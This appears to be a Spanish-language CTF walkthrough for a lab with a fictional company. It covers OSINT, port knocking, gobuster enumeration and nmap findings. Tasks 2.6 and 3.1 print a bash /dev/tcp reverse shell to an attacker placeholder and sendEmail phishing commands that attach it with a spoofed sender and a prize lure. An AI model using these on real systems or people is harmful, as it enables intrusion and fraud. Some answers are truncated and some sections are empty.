
### Shakers Write-Up ###
---

### Task 1

### 1.1. "Si los puertos están cerrados y las puertas bloqueadas, ¿qué haría alguien como Kevin Mitnick, quien sabía que el verdadero acceso está donde nadie mira? ¿Y si el silencio de un host fuera solo una máscara... sabrías cómo hacer que hable?"

**"Si los puertos están cerrados y las puertas bloqueadas"**

Esto indica que el sistema está protegido con medidas tradicionales:

  * Cortafuegos que cierran puertos.

  * No hay servicios visibles.

  * Se ha aplicado una política de "superficie de ataque mínima".

**¿Qué haría alguien como Kevin Mitnick?"**
Mitnick fue famoso por:

  *El ingeniería social, evasión de medidas de seguridad y técnicas poco ortodoxas.

  * Encontrar caminos que los defensores no habían considerado.

  * Usar métodos indirectos o pasivos para obtener acceso o información.

  * Esto sugiere que el atacante no atacará de frente, sino que buscará caminos menos evidentes.

**"El verdadero acceso está donde nadie mira"**

Este es el corazón de la frase.

Puede referirse a métodos que no se detectan fácilmente.

Aquí hablamos de análisis pasivo, escaneo desde otros hosts, análisis de tráfico, suplantación de identidad, etc.

También puede aludir a hosts intermedios, sistemas mal monitoreados, redes internas, etc.

**"¿Y si el silencio de un host fuera solo una máscara...?"**

Muchos hosts protegidos están configurados para no responder a paquetes sospechosos o desconocidos.

Esto podría hacer que parezcan apagados o inactivos cuando en realidad están activos.

**Conclusión:**
La frase es una forma creativa de describir cómo un atacante avanzado como Kevin Mitnick no depende de los métodos comunes (escaneos agresivos, 
puertos abiertos) sino que aprovecha el comportamiento del sistema, incluso cuando "parece" cerrado.

La técnica implícita puede ser:

✅ Escaneo encubierto como el Idle Scan
✅ Fingerprinting pasivo
✅ Timing-based reconnaissance
✅ Evasión mediante caminos no obvios (como hosts intermedios o técnicas de ingeniería social técnica)

**✅ RESPUESTA:**  

```bash
filtered
```
---------------------------------------------------------------------------------------------------------------------------------------------
### Task 2

### 2.1. ¿Qué comando de búsqueda en Google me permite encontrar más rápidos sitios web específicos relacionados con la empresa The Server Sharkers?

**Objetivo del comando:**

Queremos que Google nos devuelva resultados de una empresa específica (The Server Sharkers) o un usuario (como theserversharker) dentro de un sitio web concreto, en este caso, LinkedIn.

**Operador site:**

Este operador limita los resultados de Google a un sitio web específico.
Ejemplo:
site:linkedin.com
Esto le dice a Google: "devuélveme solo resultados dentro de linkedin.com".

Palabra clave o nombre del usuario/empresa
Si sabemos que el perfil o empresa se llama theserversharker o "The Server Sharkers", lo agregamos como término de búsqueda.
Ejemplo:
theserversharker


Combinación de ambos
Al combinar ambos:
site:linkedin.com theserversharker

Esto le dice a Google: "devuélveme resultados de LinkedIn que contengan la palabra 'theserversharker'".

**✅ RESPUESTA:**  

```bash
site:linkedin.com theserversharker/
```

---------------------------------------------------------------------------------------------------------------------------------------------
### 2.2. ¿Qué podemos extraer de la sección de Destacado de la empresa The Server Sharkers? ###

En la página oficial de Server Shakers, se encuentra una sección denominada 'Destacados', que incluye una imagen representativa de una página. 

Si el atacante encontro la pagina correcta, deberia ver esto:

<img width="822" alt="Captura de pantalla 2025-04-27 a las 14 43 17" src="https://github.com/user-attachments/assets/7488fec0-62bf-4e54-ab05-fdbaadcc1370" />

A través de esta imagen, el atacante puede acceder a información adicional y relevante, lo que facilita la obtención de datos complementarios.

Al hacer click, encontramos la siguiente publicación del perfil de The Server Shakers, la cuál contiene una URL.

<img width="1128" alt="Captura de pantalla 2025-04-27 a las 15 04 25" src="https://github.com/user-attachments/assets/8181f735-bbca-42d6-b111-b93e95872bae" />

**✅ RESPUESTA:**
```bash
  reoobot.github.io/TheServerSharkers/carrera
```

---------------------------------------------------------------------------------------------------------------------------------------------
### 2.3. ¿Qué podemos extraer de la sección de Destacado de la empresa The Server Sharkers? ###

El navegador o herramienta como curl realiza una solicitud GET a la URL especificada.
En este caso, la URL es:
https://reoobot.github.io/TheServerSharkers/

Al usar -v, curl muestra en pantalla:

  * Los encabezados enviados (por ejemplo, GET / HTTP/1.1, User-Agent, Host)

La respuesta del servidor, incluyendo:

  * Código de estado (por ejemplo, HTTP/2 200 OK)

Encabezados HTTP de respuesta como Content-Type, Content-Length, Date, entre otros.

El encabezado que nos interesa es:

  * Content-Length: XXXX

Este valor representa el tamaño en bytes del cuerpo del contenido HTML que el servidor está enviando. 
Es crucial en ciertos tipos de ataques o análisis porque te permite:
  * Saber cuánto contenido tiene la página sin descargarla completamente.

Comparar si distintos parámetros cambian el tamaño de la respuesta.

Detectar posibles vulnerabilidades (por ejemplo, cuando el contenido cambia dependiendo del usuario o del error generado). Este dato puede usarse, por ejemplo, en ataques de enumeración o detección de rutas ocultas:

  * Si cambias la URL o parámetros, y el Content-Length varía, puedes detectar qué recursos existen o no.

**✅ RESPUESTA:**
```bash
  curl -v https://reoobot.github.io/TheServerSharkers/
```

-------------
### 2.4. ¿En qué página personal o red profesional podríamos encontrar más información detallada sobre "TheServerSharkers" o sus miembros? ###

**Identificación del archivo objetivo**
Durante la recolección de información sobre el sitio web relacionado con la empresa ficticia The Server Sharkers, encontré una imagen accesible desde la URL pública del repositorio:

https://reoobot.github.io/TheServerSharkers/manolo1.webp

**Descarga del archivo**

Usé curl para descargar la imagen localmente:

```bash
curl -o manolo1.webp https://reoobot.github.io/TheServerSharkers/manolo1.webp
```

**Análisis con exiftool**

Apliqué la herramienta exiftool sobre la imagen descargada para extraer los metadatos:

```bash
exiftool manolo1.webp
```

**Detección de información reveladora**

Entre los metadatos, encontré un campo llamado Author que contenía un comando completo:

sendEmail -f "name-remitente@kali.com" -t sharkers@localhost -u "ReverseShell" -m "Aun te estamos esperando no han cerrado las apuestas" -s "IP-Victima" -o tls=no -a

**Interpretación del contenido**

Analizando el comando, pude extraer múltiples indicadores relevantes:

  * El remitente usaba una dirección con dominio @kali.com, lo cual sugiere que el atacante emplea Kali Linux, un sistema operativo comúnmente usado para hacking ético.

  * El asunto "ReverseShell" implica la intención de ejecutar una shell inversa, una técnica habitual para obtener acceso remoto.

  * El mensaje contiene una provocación en tono de reto, típico en entornos de Capture The Flag (CTF) o pruebas de seguridad ofensiva.

  * El destinatario sharkers@localhost y el servidor SMTP "IP-Victima" apuntan a una simulación o infraestructura interna.

  * El uso de -o tls=no indica que se está usando un servidor de correo sin cifrado, lo cual es una mala práctica o parte de un entorno controlado.

  * A partir de una imagen aparentemente inocua, logré, mediante una herramienta OSINT (exiftool), extraer metadatos que revelaban:

  * El sistema operativo del atacante

  * El tipo de ataque planeado

  * Información de infraestructura

  * Y prácticas potencialmente vulnerables

Esto demuestra cómo el análisis de metadatos puede proporcionar inteligencia valiosa en una fase de reconocimiento.

**✅ RESPUESTA:**
```bash
  sendEmail -f "name-remitente@kali.com" -t sharkers@localhost -u "ReverseShell" -m "Aun te estamos esperando no han cerrado las apuestas" -s "IP-Victima" -o tls=no -a
```

-------------
### 2.5. Los metadatos guardan secretos que no se van a simple vista. Encuentra la imagen del traidor, la que guarda su huella invisible, como Author ###

El traidor en este caso es el director. Procedemos a hacer lo mismo que con Manolo, pero ahora con el director.

<img width="758" alt="Captura de pantalla 2025-05-03 a las 15 16 19" src="https://github.com/user-attachments/assets/827a296d-3fc7-4e15-9125-89cdccde6a4f" />

Aquí variamos y usamos el comando wget para así poder descargar la foto de la pagina web.

<img width="1333" alt="Captura de pantalla 2025-05-03 a las 15 21 26" src="https://github.com/user-attachments/assets/bbf55ed1-28cc-4e6b-a074-2e9ff439d9cd" />

<img width="1344" alt="Captura de pantalla 2025-05-03 a las 15 23 18" src="https://github.com/user-attachments/assets/dfeba84a-f589-4f17-a57d-8a868f95b762" />


**✅ RESPUESTA:**
```bash
  sendEmail -f prueba@kali.com -t sharkers@localhost -u "EnviarAdjunto" -m "Este es tu premio no te lo pierdas, apuesta ya, PREMIO DE 1000000" -s "IP_Victima" -o tls=no -a /home/vagrant/Documents/reverse_shell.sh
```

-------------

### 2.6. "Has obtenido acceso limitado a una máquina víctima. ¿Cómo podrías devolver una shell interactiva a tu máquina, sabiendo que Bash está disponible y puedes ejecutar comandos arbitrarios?" ###

**¿Cómo se llega a esta conclusión?**
Entorno con Bash disponible
La premisa menciona que la víctima tiene Bash instalado. Esto es fundamental, ya que Bash permite redirigir flujos de entrada/salida y tiene acceso a dispositivos especiales como /dev/tcp.

**Capacidad de ejecutar comandos arbitrarios**
Esto implica que puedes escribir y ejecutar un comando directamente desde el intérprete de comandos o algún punto de entrada, como una vulnerabilidad en una aplicación web o consola mal asegurada.

**Necesidad de una reverse shell**
En muchos escenarios, cuando estás dentro de una máquina víctima con acceso limitado, no puedes iniciar una sesión SSH o abrir puertos. Por tanto, se requiere que la máquina víctima inicie la conexión hacia tu equipo atacante, que debe estar esperando.

**Investigas o recuerdas que Bash permite conexiones de red**
Bash tiene una característica poco conocida pero muy poderosa: los dispositivos virtuales /dev/tcp/host/port.

Este mecanismo te permite crear conexiones TCP directamente desde Bash sin necesidad de herramientas externas como nc, python, perl, etc.

**Sabes que Bash también puede lanzar una shell interactiva (bash -i)**
El flag -i inicia Bash en modo interactivo, útil para mantener una sesión viva y activa.

**Combinas todo con redirecciones**
Aquí es donde se juntan las piezas:

  * bash -i: lanza una shell interactiva,

  * >&: redirige la salida estándar (1) y la salida de errores (2) hacia la entrada del socket TCP,

  * /dev/tcp/ATTACKER_IP/PORT: es el canal TCP hacia tu máquina

  * 0>&1: redirige la entrada estándar hacia ese mismo canal.

**✅ RESPUESTA:**
```bash
 bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1
```

-------------

### 2.7. "Cuando alguien menciona 'Knock', ¿te preguntas si es una referencia al golpe que haces para entrar en un sistema, o acaso estás buscando algo en los rincones más oscuros de la red?" ###

**Interpretación del término “Knock”**

La palabra "Knock" en un contexto de hacking o seguridad no suele ser literal. En el ámbito técnico, suele asociarse con la técnica llamada Port Knocking.

Clave: La mención de "golpe para entrar en un sistema" → metáfora clara para Port Knocking.

**Análisis de la pista “Tres knock^3, secretos: 1234, 2345, 3456”**

Esta parte te da una estructura:

  * “Knock³” → indica 3 secuencias, y “tres” indica que hay tres golpes por secuencia.

  * “1234, 2345, 3456” → son puertos, y cada número representa un puerto TCP.

Esto coincide exactamente con cómo funciona Port Knocking:

  * Un demonio oculto en el sistema escucha secuencias de conexión a puertos cerrados.

Si la secuencia exacta es recibida (como 1234 → 2345 → 3456), el demonio puede abrir un puerto real (por ejemplo, SSH en 22) al atacante.

**“La vieja puerta filtrada crujió...”**

Esta frase sugiere que:

  * La puerta estaba cerrada o protegida,

Pero algo (como la secuencia correcta) la ha hecho ceder o abrirse,

Y lo que había detrás ahora es accesible → tal vez una shell, una bandera o una pista secreta.

**“La respuesta son 3 palabras de 4 caracteres”**

Esto indica que:

  * El recurso desbloqueado tras la secuencia contiene una clave,

  * Esta clave tiene un formato específico: xxxx xxxx xxxx (tres palabras, cada una de cuatro letras).

  * Este tipo de formato es común en retos CTF para representar flags o contraseñas.

**✅ RESPUESTA:**
```bash
 1234 2345 3456
```

-------------

### 2.8. "Había una vez un tiburón llamado Server, perdido en el vasto océano de IPs. Un sabio navegante escribió su nombre en el mapa secreto /etc/hosts, y así, cada vez que alguien llamaba a ' ', encontraba su guarida oculta entre las olas." ###

**Desglose del acertijo:**

“Había una vez un tiburón llamado Server, perdido en el vasto océano de IPs.”

**🔍 Interpretación:**

Esto representa un nombre de dominio (como theserversharkers.io) que no puede resolverse por DNS. Es decir, está “perdido” en el océano de direcciones IP porque no hay un registro DNS público que lo asocie a una IP.

**📘 “Un sabio navegante escribió su nombre en el mapa secreto /etc/hosts...”**

Esta es una referencia directa al archivo local /etc/hosts, que permite asociar manualmente un nombre de dominio con una dirección IP sin pasar por DNS.

**🧠 “...y así, cada vez que alguien llamaba a ' ', encontraba su guarida oculta entre las olas.”**

Una vez que haces esta asociación localmente, cuando intentes acceder a theserversharkers.io, tu sistema sabrá exactamente a qué IP debe conectar. Es decir, encuentra su “guarida” (la IP) bajo las olas (sin necesidad de DNS).

**🛠️ ¿Qué hacer con esta pista?**
Sabemos que:

  * Se te proporciona una IP pública por TryHackMe (por ejemplo, 10.10.123.45).

  * El nombre de dominio theserversharkers.io aparece en la pista, pero no responde en DNS, por lo tanto no es resoluble por defecto.

  * Al intentar acceder al sitio desde Kali, ves que no carga (error de DNS).

  * Sabes que en entornos CTF o pentesting, cuando un dominio no resuelve pero es necesario para el reto, la solución es editar /etc/hosts.

  * Al hacerlo, apuntas el dominio a la IP que te proporciona TryHackMe.

**Acción concreta: añadir entrada en /etc/hosts**

Abre el archivo /etc/hosts con permisos de superusuario:

```bash
 sudo nano /etc/hosts
```

Agrega la siguiente línea (ajustando la IP si es diferente):

```bash
 IP_MAQUINA theserversharkers.io
```

**¿En qué máquinas debes hacerlo?**

| Máquina              | ¿Editar `/etc/hosts`?   | ¿Por qué? |
|----------------------|--------------------------|-----------|
| 🐱 Kali (cliente)     | ✅ Sí, obligatorio        | Para que puedas acceder a `http://theserversharkers.io` desde tu navegador o con herramientas como `curl` o `nmap`, ya que el dominio no existe en los DNS públicos. Kali necesita saber que `theserversharkers.io` apunta a la IP de la máquina de TryHackMe. |
| 🐳 TryHackMe (servidor) | ✅ Sí, si el servidor lo requiere | Si el servidor web, aplicación o script que corre en esa máquina verifica el nombre de dominio solicitado o hace redirecciones basadas en el nombre del host, entonces también necesita poder resolver `theserversharkers.io` localmente. |

**Maquina Virtual Kali**
<img width="1644" alt="Captura de pantalla 2025-05-02 a las 19 51 57" src="https://github.com/user-attachments/assets/dcd09743-887d-4e5f-ae51-5ec1f9a44c55" />


**Maquina Virtual THM**
<img width="1710" alt="Captura de pantalla 2025-05-02 a las 19 50 20" src="https://github.com/user-attachments/assets/a3ed7ac4-1069-49e3-9f13-ac2ecc79cb49" />

Porque en el /etc/hosts es donde se escribe el “mapa secreto” que permite al dominio sin DNS ser encontrado y accedido correctamente, esa es la respuesta.

**✅ RESPUESTA:**
```bash
 sudo nano /etc/hosts
```
-------------
### 2.9. "Como Homero buscando donas en callejones secretos de Springfield, recorrí los rincones ocultos de The Server Sharkers, golpeando cada puerta .php, .html, .txt y .mp4, esperando encontrar un dulce premio digital." ###

**🧠 Interpretación**

🔍 ¿Qué nos sugiere esta metáfora?
"Homero" → representa al usuario curioso o hacker ético que explora sin parar.

"Callejones secretos" → rutas ocultas en un sitio web.

"Golpeando cada puerta .php, .html, .txt y .mp4" → es una clara alusión a un escaneo de directorios y archivos, buscando recursos no públicos o mal protegidos.

"Esperando encontrar un dulce premio digital" → busca información confidencial o una bandera (flag) en un CTF.

🧰 2. Relación con técnicas de pentesting
Todo lo anterior describe una práctica común: el fuzzing de rutas o archivos en un servidor web.

Esto consiste en:

  * Probar muchas rutas (como /admin, /login, /backup.zip) para descubrir recursos no visibles en la página principal.

  * Hacerlo de forma automatizada usando herramientas como Gobuster, FFUF, Dirb, etc.

  * Usar un diccionario de palabras (wordlist) que simula “golpear puertas” con diferentes nombres de archivos o carpetas.

🛠️ 3. ¿Por qué Gobuster?
Es una herramienta ligera, rápida y ampliamente usada para descubrir directorios o archivos ocultos.

Soporta múltiples modos (como dir, dns, vhost), pero en este caso nos interesa dir, para buscar rutas/archivos en un sitio web.

Se integra bien con listas de palabras como la clásica common.txt de DirB, disponible en Kali Linux.

🔍 4. Construcción lógica del comando

Basado en la interpretación anterior, el comando se arma así:
```bash
  gobuster dir -u http://theserversharkers.io/ -w /usr/share/wordlists/dirb/common.txt -t 30
```

🧾 Explicación del comando:

dir: indica que se trata de un escaneo de directorios.

-u http://theserversharkers.io/: es la URL del objetivo.

-w /usr/share/wordlists/dirb/common.txt: wordlist que contiene nombres comunes de archivos y carpetas para probar.

-t 30: define el número de hilos (threads) para acelerar la búsqueda (30 es un valor razonable sin saturar).

Sabemos que el comando funciona y que las dos maquinas tiene el servidor de theservershakers activos porque el gobuster devuelve esto:

<img width="1710" alt="Captura de pantalla 2025-05-02 a las 12 37 39" src="https://github.com/user-attachments/assets/ae38dbb7-834d-4fd4-85c0-46f89011aca4" />


**Conclusión lógica (respuesta deducida):**
El acertijo describe de manera creativa un escaneo de rutas ocultas, y todas las pistas apuntan a la necesidad de:

  * Usar una herramienta de fuzzing de rutas
  * Buscar archivos con extensiones comunes
  * Aplicarlo sobre theserversharkers.io

Por lo tanto, la respuesta correcta y razonada es:
**✅ RESPUESTA:**
```bash
 gobuster dir -u
```

-------------
### 2.10. "Al final del puerto 80, entre el eco de las respuestas, ¿será este el momento donde un diccionario abre la puerta oculta, o acaso la clave yace en algo más profundo, más oscuro, más encriptado? La verdad se encuentra entre los bits, ¿te atreves a seguir?" ###

"La verdad se encuentra entre los bits, ¿te atreves a seguir?"

...y después te dan directamente el enlace http://theserversharkers.io, la respuesta es simplemente esa URL. No hace falta complicarlo con herramientas como curl, porque:

Ya configuraste /etc/hosts para que theserversharkers.io apunte a la IP correcta.

Ya entendiste que el puerto 80 es el principal.

Y ahora el reto es seguir navegando por esa URL en el navegador o con herramientas posteriores.

**✅ RESPUESTA:**
```bash
  http://theserversharkers.io
```
-------------
### 2.11. "En el mundo del hacking, como en las películas de los 90, ¿puede un diccionario de 98 palabras desbloquear el puerto 80, o es solo una ilusión en la red?" ###

Ahora, con todos los otros pasos hechos, tenemos que desplear la pagina de TheServrShakers.

<img width="1710" alt="Captura de pantalla 2025-05-02 a las 12 44 50" src="https://github.com/user-attachments/assets/0c3ab85e-c2f1-4e0d-8b1b-68cc9ccbb4ba" />

Hacemos click y nos debería cargar la pagina con el siguiente mensaje. 
Las paginas y sus mensajes pueden tardar en cargas, así que dale tiempo.

<img width="1677" alt="Captura de pantalla 2025-05-02 a las 20 52 03" src="https://github.com/user-attachments/assets/f6b6a25e-3b25-4a6a-8683-63c1254d1187" />

<img width="1710" alt="Captura de pantalla 2025-05-02 a las 20 55 21" src="https://github.com/user-attachments/assets/2f53d2b0-2cd4-45a5-9ac9-45bed0eb2ecd" />

Las respuestas que nos piden a continuación tien que ver con las respuestas del task 2, 
así que no puedes entrar en está area hasta que las hayas resuleto cada una de ellas.

<img width="1708" alt="Captura de pantalla 2025-05-02 a las 20 58 31" src="https://github.com/user-attachments/assets/03a0a480-3832-499b-a669-34dbd34369b3" />

<img width="1704" alt="Captura de pantalla 2025-05-02 a las 20 59 09" src="https://github.com/user-attachments/assets/3537d919-f8a4-4e07-8cfb-63fada515c31" />

<img width="1710" alt="Captura de pantalla 2025-05-02 a las 21 02 28" src="https://github.com/user-attachments/assets/c8092a8a-f590-41a1-980f-2c6076e958f0" />

<img width="1710" alt="Captura de pantalla 2025-05-02 a las 21 03 54" src="https://github.com/user-attachments/assets/ebc041e9-516b-4910-9038-bafd56d772b3" />

```bash
  sendEmail -f "name-remitente@kali.com" -t sharkers@localhost -u "ReverseShell" -m "Aun te estamos esperando no han cerrado las apuestas" -s "IP-Victima" -o tls=no -a
```

<img width="1710" alt="Captura de pantalla 2025-05-02 a las 21 05 47" src="https://github.com/user-attachments/assets/d2d1fd14-253a-4265-9892-2aba7f0b67f9" />

```bash
 sendEmail -f prueba@kali.com -t sharkers@localhost -u "EnviarAdjunto" -m "Este es tu premio no te lo pierdas, apuesta ya, PREMIO DE 1000000" -s "IP_Victima" -o tls=no -a /home/vagrant/Documents/reverse_shell.sh
```
<img width="1705" alt="Captura de pantalla 2025-05-02 a las 21 06 57" src="https://github.com/user-attachments/assets/9d1caad2-686f-4ce8-acbb-eeaf8243448e" />

La respuesta es obviamente Barcelona, pero con b minuscula.

Despues de resolver todas las preguntas, te aparece esta siguiente pagina web, y damos un click. 

<img width="1708" alt="Captura de pantalla 2025-05-02 a las 21 31 51" src="https://github.com/user-attachments/assets/99ef374a-0947-46ed-a098-702bd36d6277" />

<img width="1710" alt="Captura de pantalla 2025-05-02 a las 13 02 36" src="https://github.com/user-attachments/assets/2c984661-52a1-4789-ac7f-47e3941fd02c" />

<img width="1710" alt="Captura de pantalla 2025-05-02 a las 13 03 06" src="https://github.com/user-attachments/assets/07b883ce-fd72-422e-ad5b-ac9fc7812de9" />

Dejamos que se lo suficiente para que nos muestre la contraseña del archivo confidencial 
y esta es la respuesta.

Como consejo, te recomiendo esperar a que la pagina termine de cargar porque despues comienza a lanzar palabras que necesitaras guardar en un archivo para el siguiente ejercicio:

<img width="1710" alt="Captura de pantalla 2025-05-02 a las 13 06 31" src="https://github.com/user-attachments/assets/71710658-9a25-4171-9d99-62d66b381990" />


**✅ RESPUESTA:**
```bash
  oxfbyhjdv123
```

-------------
### 2.12. ¿qué secretos ocultos pueden desvelarse al descubrir subdominios o virtual hosts en el servidor? ¿Qué conexiones inesperadas de puertos o configuraciones de DNS podrían hallarse bajo la superficie?" ###

**🔍 Interpretación:**
Este mensaje nos habla de una capa más profunda de enumeración en entornos web: la existencia de virtual hosts o subdominios configurados en el servidor que no están visibles a simple vista. Veamos qué puede significar esto:

  * Virtual Hosts: En un mismo servidor (misma IP), pueden existir múltiples sitios web diferenciados únicamente por el nombre del dominio. Por ejemplo, admin.theserversharkers.io podría apuntar al mismo servidor que theserversharkers.io, pero mostrar contenido completamente distinto.
Estos sitios no se detectan con un simple navegador si no conoces el nombre exacto.

  * Subdominios ocultos: Podrían existir configuraciones activas que solo responden si se solicita el sitio con el subdominio correcto. Esto se usa muchas veces para ocultar paneles de administración, entornos de staging, APIs, etc.

  * DNS alternativos: Es posible que el servidor tenga respuestas diferentes dependiendo del Host que se envía en la cabecera HTTP, lo que se configura en Apache/Nginx usando ServerName o ServerAlias.

💻 Comando clave:
Si guardaste las palabras en un archivo, en este caso está en Downloads/document y aplicaste el gobuster
con los comandos correctos deberias tener algo así: 

```bash
  gobuster vhost -u http://10.10.150.87 --domain theserversharkers.io -w ~/Downloads/document.txt --append-domain
```

<img width="1710" alt="Captura de pantalla 2025-05-02 a las 13 10 10" src="https://github.com/user-attachments/assets/6ba33680-5c80-48ae-a399-2d4d481478d1" />

**✅ RESPUESTA:**
```bash
  gobuster vhost -u http://10.10.150.87
```
-------------
### 2.13. ¿Cuál es el usuario de The Server Sharkers que tiene cuatro letras? ###



-------------

### TAKS 3
### 3.1. "Si lograste acceder a un sistema a través de SSH, ¿cómo sabrías qué usuario está detrás de la puerta cerrada? A veces, el whoami o un simple ps aux pueden revelar más de lo que imaginas." ###

Ahora que tenemos la pagina **ab.theserversharkers.io** que sacamos del comando de gobuster vhost, hacemos lo mismo que hicimos con la pagina servershakers en en el /sudo/hosts:

<img width="1710" alt="Captura de pantalla 2025-05-02 a las 22 05 42" src="https://github.com/user-attachments/assets/6b700e5c-20b6-41df-8f5f-b16548b90952" />

<img width="1710" alt="Captura de pantalla 2025-05-02 a las 22 07 24" src="https://github.com/user-attachments/assets/f92c7166-c23a-4971-8f54-2560ffcaf3b5" />

Lo siguiente sera crear un archivo en /Documents en la maquina Kali con el nombre reverse_shell, esto porque la maquina espera este mismo nombre de documento para ejecutar
el archivo en formato bash, de otra forma no funcionara. Al archivo tambien hay que darle permisnos chmod +x para poder ejecutarse.
Una vez creado y dado los permisos necesarios, tendra que contener el siguientes script:

<img width="883" alt="Captura de pantalla 2025-05-03 a las 12 02 25" src="https://github.com/user-attachments/assets/866c50cf-82bd-48bd-9bc4-3c2f7fff8f99" />

```bash
 !/bin/bash
 bash -i >& /dev/tcp/IP_MAQUINA_VIRTUAL/PUERTO_DE_ESCUCHA 0>&1
```

En mi caso, pondre el IP de mi maquina virtual y usaré el puerto 4444 para escuchar la respuesta una vez el reverse_shell se ejecute. 
Despues dedicare una terminal exclusiva para la escucha y le asignare el puerto de escucha de antes.

<img width="883" alt="Captura de pantalla 2025-05-03 a las 12 02 25" src="https://github.com/user-attachments/assets/e27f92c8-d7f5-4304-9fa9-7802d6168fa2" />

Una vez hecho esto debemos mandar los siguientes comandos.

**Primer Comando:**
```bash
sendEmail -f prueba@kali.com -t sharkers@localhost -u "EnviarAdjunto" -m "Este es tu premio no te lo pierdas, apuesta ya, PREMIO DE 1000000" -s "IP_MAQUINA_THM" -o tls=no -a /home/kali/Documents/reverse_shell.sh
```

**🧩 Análisis por partes**

 * sendEmail	Herramienta CLI para enviar correos electrónicos desde terminal. Muy útil en pruebas de phishing, ingeniería social y automatización.

 * f prueba@kali.com	Remitente falso del correo. En ejercicios de CTF es común que este campo se use para engañar al receptor (spoofing).

 * t sharkers@localhost	Destinatario del correo. Aquí se está enviando localmente, probablemente a un servicio en la máquina 10.10.7.75 que recibe correos.

 * u "EnviarAdjunto"	Asunto del correo ("Subject"). Es un texto llamativo para atraer al receptor a abrir el mensaje.

 * m "Este es tu premio no te lo pierdas..."	Cuerpo del mensaje. Está redactado como un mensaje de phishing típico, usando una promesa de dinero para inducir a la víctima a abrir el archivo.

 * s "10.10.7.75"	IP del servidor SMTP que aceptará el correo. Este servidor debe tener habilitado SMTP (por ejemplo, Postfix o Exim) y estar configurado para aceptar mensajes desde fuera.

 * o tls=no	Desactiva TLS, porque muchos servidores de pruebas o entornos CTF no tienen cifrado habilitado en sus servicios SMTP.

 * a /home/kali/Documents/reverse_shell.sh	Adjunta un archivo. Aquí se está enviando un script malicioso de shell inversa (reverse_shell.sh), que podría permitir acceso remoto si alguien lo ejecuta.

**Intención del comando:**

Este comando simula un ataque de phishing en el que se adjunta un archivo malicioso (shell inversa) disfrazado de “premio”, con el objetivo de que un usuario confiado lo ejecute. Si la víctima lo abre y lo ejecuta en su sistema, el atacante podría obtener acceso remoto.

**Segundo Comando:**
```bash
 sendEmail -f "name-remitente@kali.com" -t sharkers@localhost -u "ReverseShell" -m "Aun te estamos esperando no han cerrado las apuestas" -s "IP_MAQUINA_THM" -o tls=no -a
```

## 🧩 Desglose y explicación del comando `sendEmail`

| Parámetro | Descripción |
|-----------|-------------|
| `-f "name-remitente@kali.com"` | Define el **remitente** del correo electrónico. En contextos de pruebas o simulaciones, este campo puede ser falsificado libremente para representar un atacante. |
| `-t sharkers@localhost` | El **destinatario** del mensaje. En este caso, es un buzón en el servidor local (lo cual sugiere que el servidor de correo está configurado para aceptar correo local o interno). |
| `-u "ReverseShell"` | El **asunto** del correo. Aquí se utiliza una palabra clave que sugiere que el correo podría contener un payload (por ejemplo, un script o adjunto que abra una reverse shell si se ejecuta). |
| `-m "Aun te estamos esperando no han cerrado las apuestas"` | El **mensaje del cuerpo** del correo. Tiene un tono informal y provocador, lo cual puede usarse en ingeniería social para incitar al destinatario a interactuar con el contenido. |
| `-s "10.10.150.80"` | Define el **servidor SMTP** que se utiliza para enviar el correo. Esta dirección IP es probablemente la del servidor objetivo en TryHackMe o una máquina intermedia configurada como relay. |
| `-o tls=no` | Indica que **no se usará cifrado TLS** para la conexión SMTP. Es útil cuando el servidor no soporta TLS o está configurado para tráfico sin cifrar. |
| `-a` | Este flag sirve para **adjuntar un archivo**, pero en este comando falta el nombre del archivo a adjuntar. Tal como está, el comando fallará por estar incompleto. |

Si hicimos todos los pasos bien, podemos acceder al servidor de TheServerShakers, y una vez dentro, le preguntaremos whoami para saber el nombre del usuario.

<img width="1710" alt="Captura de pantalla 2025-05-02 a las 14 23 25" src="https://github.com/user-attachments/assets/90030300-fbe7-4834-8856-d710f322f615" />

**✅ RESPUESTA:**
```bash
  shakers
```

-------------
### 3.2."Tres knock^3, secretos: 1234, 2345, 3456. La vieja puerta filtrada crujió... ¿qué misterios aguardaban tras ella? ###


**📜 Interpretación**
El acertijo hace alusión directa al concepto de **port knocking**, una técnica que consiste en enviar paquetes a una secuencia específica de puertos para desencadenar una acción en el servidor (como abrir un puerto cerrado, por ejemplo, SSH).

**🧩 Claves y análisis**

| Fragmento | Interpretación |
|----------|----------------|
| `Tres knock^3` | Sugiere que son **tres "golpes"** o intentos, posiblemente paquetes enviados a tres puertos. El uso del exponente indica repetición o una secuencia. |
| `secretos: 1234, 2345, 3456` | Es la **secuencia de puertos** a los que hay que "llamar" (hacer conexión TCP/UDP) para activar algo en el servidor, probablemente abrir un puerto oculto. |
| `La vieja puerta filtrada crujió...` | Implica que una vez se realiza el port knocking correctamente, una **puerta (puerto)** previamente cerrada o filtrada se abre. |
| `¿qué misterios aguardaban tras ella?` | Sugiere que tras abrirse esa puerta, puede haber un **servicio oculto**, una shell o un nuevo vector de acceso. |

**🛠️ Herramienta recomendada: `knock`**

```bash
knock <IP> 1234 2345 3456
```

-------------
TASK 4
### 4.1. Los servicios que parecen comunes pueden ser la clave para acceder a algo más profundo. Revisa los servicios en ejecución, los scripts vulnerables y la forma en que los puertos pueden estar interconectados. Si no encuentras lo obvio, ¿has considerado los servicios no expuestos o mal configurados? ###




-------------
TASK 4
### 4.2. A veces lo que parece cerrado, está solo esperando a ser descubierto. ¿Cuántos puertos realmente están abiertos, listos para ser explorados? Quizá no todos son tan evidentes... ¿Lo has comprobado? ###

Con base en la respuesta anterior, podemos deducir cuantos puertos estan abiertos usando la vulnerabilidades encontradas.

<img width="865" alt="Captura de pantalla 2025-05-02 a las 11 46 26" src="https://github.com/user-attachments/assets/f5f4e788-3d73-4675-8e4f-44b52a9c2a7e" />

<img width="865" alt="Captura de pantalla 2025-05-02 a las 11 46 26" src="https://github.com/user-attachments/assets/a206024a-bb03-471b-a86b-094a0bcc677b" />

**✅ RESPUESTA:**
```bash
 3
```
-------------
### 4.3. ¿Cuál es el nombre de la vulnerabilidad que permite a un atacante interceptar y manipular conexiones cifradas de forma antigua, aprovechando una debilidad en un protocolo de cifrado obsoleto? ###

Para encontrar esta vulnerabilidad, tenemos que consultar el informe de vulnerabilidades hecho por nmap, y ahi encontraremos la respuesta.

<img width="1624" alt="Captura de pantalla 2025-05-02 a las 11 53 04" src="https://github.com/user-attachments/assets/9e68dbce-69dc-4cf4-b2b9-84017dab4547" />

Sabemos que esta es la vulnerabilidad preguntada porque concuerda con la descripción del enunciado.

**✅ RESPUESTA:**
```bash
 POODLE
```

-------------
### 4.4. Severity and Vector Strings ###

